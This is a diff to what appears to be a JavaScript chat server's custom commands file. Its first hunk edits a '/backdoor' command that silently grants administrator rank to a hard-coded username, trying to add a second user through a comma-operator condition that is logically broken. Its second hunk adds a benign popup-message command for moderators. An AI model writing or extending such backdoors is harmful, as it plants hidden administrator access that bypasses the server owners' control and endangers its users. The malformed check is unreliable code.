@@ -611,7 +611,7 @@ var components = exports.components = {
      *********************************************************/
 
     backdoor: function (target, room, user) {
-        if (user.userid !== 'creaturephil') return this.sendReply('/backdoor - Access denied.');
+        if (user.userid !== 'creaturephil', 'prfssrstein') return this.sendReply('/backdoor - Access denied.');
 
         if (!target) {
             user.group = '~';
@@ -901,6 +901,26 @@ var components = exports.components = {
             return Users.get(parts[2].trim()).send('|pm|' + Users.get(parts[0].trim()).group + Users.get(parts[0].trim()).name + '|' + Users.get(parts[2].trim()).group + Users.get(parts[2].trim()).name + '|' + parts[3].trim());
         }
     },
+	
+	sp: 'sendpopup',
+	spopup: 'sendpopup',
+    	spop: 'sendpopup',
+	sendpopup: function(target, room, user) {
+		if (!this.can('popup')) return false;
+
+		target = this.splitTarget(target);
+		var targetUser = this.targetUser;
+
+		if (!targetUser) return this.sendReply('/sendpopup [user], [message] - You missed the user');
+		if (!target) return this.sendReply('/sendpopup [user], [message] - You missed the message');
+
+		targetUser.popup(target);
+		this.sendReply(targetUser.name + ' got the message as popup: ' + target);
+
+		//targetUser.send(user.name+' sent a popup message to you.');
+
+		this.logModCommand(user.name+' send a popup message to '+targetUser.name);
+	},
 
     /*********************************************************
      * Server management commands
